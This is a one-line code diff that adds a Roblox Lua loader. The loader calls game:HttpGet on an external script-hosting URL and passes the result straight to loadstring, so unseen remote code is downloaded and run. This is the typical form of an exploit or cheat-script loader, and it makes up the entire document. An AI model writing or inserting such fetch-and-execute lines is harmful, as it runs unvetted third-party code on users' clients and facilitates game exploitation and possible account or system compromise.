@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://bloxscript-cloud.vercel.app/api/v1/luascripts/public/kfRqaPyznDAf/download?raw=true"))()
